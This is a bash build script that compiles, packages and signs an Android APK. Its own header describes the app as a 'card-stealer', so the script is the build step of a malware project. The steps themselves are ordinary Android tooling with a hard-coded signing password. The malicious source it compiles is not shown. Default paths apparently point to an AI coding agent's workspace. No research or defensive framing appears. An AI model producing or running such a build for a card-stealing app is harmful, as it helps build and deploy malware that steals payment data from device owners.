#!/usr/bin/env bash
# Builds the WIFISINNER Android card-stealer APK (WIFISINNER.apk).
# Requires: JDK (javac/keytool/java), Android build-tools (aapt2, zipalign, apksigner),
#           android.jar, and an R8 jar (newer than the bundled d8; the bundled d8 in
#           build-tools 34 has a bug running on JDK 21).
# Override with: JAVA_HOME, ANDROID_SDK_BUILD_TOOLS, ANDROID_JAR, R8_JAR.
set -euo pipefail
cd "$(dirname "$0")"

JH="${JAVA_HOME:-/tmp/opencode/android/tools/jdk}"
BT="${ANDROID_SDK_BUILD_TOOLS:-/tmp/opencode/android/tools/bt/android-14}"
AJ="${ANDROID_JAR:-/tmp/opencode/android/dl/android.jar}"
R8="${R8_JAR:-/tmp/opencode/android/dl/r8.jar}"

OUT=out
rm -rf "$OUT"
mkdir -p "$OUT/classes"

echo "[1/5] javac"
"$JH/bin/javac" --release 8 -classpath "$AJ" -d "$OUT/classes" \
    $(find src -name '*.java')

echo "[2/5] d8 (R8 $R8)"
# provide java.base from the JDK so d8 can see java.lang for desugaring
BASE=$(mktemp -d)
unzip -oq "$JH/jmods/java.base.jmod" 'classes/*' -d "$BASE"
"$JH/bin/java" -cp "$R8" com.android.tools.r8.D8 --release \
    --lib "$AJ" --lib "$BASE/classes" --min-api 21 \
    --output "$OUT" $(find "$OUT/classes" -name '*.class')
rm -rf "$BASE"

echo "[3/5] aapt2 link + inject dex"
"$BT/aapt2" link -o "$OUT/base.apk" -I "$AJ" \
    --manifest AndroidManifest.xml \
    --min-sdk-version 4 --target-sdk-version 21 --auto-add-overlay
python3 - "$OUT/base.apk" "$OUT/classes.dex" <<'PY'
import sys, zipfile
apk, dex = sys.argv[1], sys.argv[2]
with zipfile.ZipFile(apk, 'a', zipfile.ZIP_DEFLATED) as z:
    z.writestr('classes.dex', open(dex, 'rb').read())
PY

echo "[4/5] zipalign"
"$BT/zipalign" -f 4 "$OUT/base.apk" "$OUT/aligned.apk"

echo "[5/5] sign"
KS="$OUT/debug.keystore"
if [ ! -f "$KS" ]; then
    "$JH/bin/keytool" -genkeypair -keystore "$KS" -alias wifisinner \
        -keyalg RSA -keysize 2048 -validity 10000 \
        -storepass wifisinner -keypass wifisinner \
        -dname "CN=WIFISINNER, O=WIFISINNER, C=US"
fi
"$BT/apksigner" sign --ks "$KS" --ks-pass pass:wifisinner --out WIFISINNER.apk "$OUT/aligned.apk"

echo "BUILD OK: $(pwd)/WIFISINNER.apk"
